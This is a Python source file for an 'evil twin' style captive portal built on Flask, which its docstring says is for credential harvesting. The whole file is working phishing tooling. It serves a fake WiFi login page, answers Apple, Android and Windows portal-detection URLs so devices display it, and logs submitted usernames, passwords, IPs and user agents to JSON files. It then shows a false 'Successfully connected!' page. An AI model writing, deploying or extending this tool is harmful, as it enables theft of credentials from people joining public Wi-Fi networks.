#!/usr/bin/env python3
"""
Advanced Captive Portal Engine
Handles multiple portal templates and credential harvesting
"""

import os
import threading
from flask import Flask, request, render_template_string, redirect, jsonify
import json
import time
from colorama import Fore, Style
import logging

class CaptivePortalEngine:
    def __init__(self, template="hotel_login", port=8080, redirect_url="http://www.google.com"):
        self.template = template
        self.port = port
        self.redirect_url = redirect_url
        self.app = Flask(__name__)
        self.is_running = False
        self.credentials = []
        self.setup_routes()
        
        # Setup logging
        self.logger = logging.getLogger('captive_portal')
    
    def load_template(self, template_name):
        """Load HTML template from file"""
        template_path = f"portals/{template_name}.html"
        
        try:
            with open(template_path, 'r') as f:
                return f.read()
        except FileNotFoundError:
            # Fallback to default template
            return self.get_default_template()
    
    def get_default_template(self):
        """Return default captive portal template"""
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>WiFi Login</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
                input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 5px 0; }
                button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; border-radius: 3px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>WiFi Login Required</h2>
                <form method="POST">
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Connect</button>
                </form>
            </div>
        </body>
        </html>
        """
    
    def setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/')
        def index():
            """Main captive portal page"""
            template_content = self.load_template(self.template)
            return render_template_string(template_content)
        
        @self.app.route('/login', methods=['POST'])
        def login():
            """Handle login form submission"""
            # Collect all form data
            form_data = dict(request.form)
            client_ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            # Log the credentials
            credential_data = {
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'client_ip': client_ip,
                'user_agent': user_agent,
                'form_data': form_data,
                'template': self.template
            }
            
            self.credentials.append(credential_data)
            self.log_credential(credential_data)
            
            print(f"{Fore.GREEN}[+] Captured credentials from {client_ip}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    Username/Data: {form_data}{Style.RESET_ALL}")
            
            # Redirect to success page or external URL
            return f"""
            <html>
            <head>
                <meta http-equiv="refresh" content="2;url={self.redirect_url}">
                <title>Success</title>
                <style>
                    body {{ font-family: Arial; text-align: center; padding: 50px; }}
                    .success {{ color: green; font-size: 24px; }}
                </style>
            </head>
            <body>
                <div class="success">✓ Successfully connected!</div>
                <p>Redirecting to the internet...</p>
            </body>
            </html>
            """
        
        @self.app.route('/hotspot-detect.html')
        def hotspot_detect():
            """Apple captive portal detection"""
            return redirect('/', code=302)
        
        @self.app.route('/generate_204')
        def generate_204():
            """Android/Chrome captive portal detection"""
            return '', 204
        
        @self.app.route('/library/test/success.html')
        def windows_detect():
            """Windows captive portal detection"""
            return redirect('/', code=302)
        
        @self.app.route('/ncsi.txt')
        def ncsi_txt():
            """Windows NCSI detection"""
            return "Microsoft NCSI", 200
        
        @self.app.route('/api/check')
        def api_check():
            """JSON API for mobile apps"""
            return jsonify({"status": "login_required"})
    
    def log_credential(self, credential_data):
        """Log captured credentials to file"""
        log_file = f"logs/credentials/captured_{int(time.time())}.json"
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        with open(log_file, 'a') as f:
            f.write(json.dumps(credential_data) + '\n')
        
        self.logger.info(f"Credential captured from {credential_data['client_ip']}")
    
    def start(self):
        """Start the captive portal server"""
        print(f"{Fore.CYAN}[*] Starting captive portal on port {self.port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Using template: {self.template}{Style.RESET_ALL}")
        
        # Run Flask in a separate thread
        self.flask_thread = threading.Thread(
            target=lambda: self.app.run(
                host='0.0.0.0',
                port=self.port,
                debug=False,
                threaded=True
            )
        )
        self.flask_thread.daemon = True
        self.flask_thread.start()
        
        self.is_running = True
        print(f"{Fore.GREEN}[+] Captive portal started successfully{Style.RESET_ALL}")
    
    def stop(self):
        """Stop the captive portal server"""
        print(f"{Fore.CYAN}[*] Stopping captive portal{Style.RESET_ALL}")
        self.is_running = False
        
        # Flask doesn't have a clean way to stop in another thread
        # We'll rely on the daemon thread to be killed when main exits
        print(f"{Fore.GREEN}[+] Captive portal stopped{Style.RESET_ALL}")
    
    def get_captured_credentials(self):
        """Get all captured credentials"""
        return self.credentials.copy()
    
    def change_template(self, new_template):
        """Change the portal template"""
        print(f"{Fore.CYAN}[*] Changing portal template to: {new_template}{Style.RESET_ALL}")
        self.template = new_template
    
    def export_credentials(self, filename=None):
        """Export captured credentials to file"""
        if not filename:
            filename = f"credentials_export_{int(time.time())}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.credentials, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Credentials exported to: {filename}{Style.RESET_ALL}")
        return filename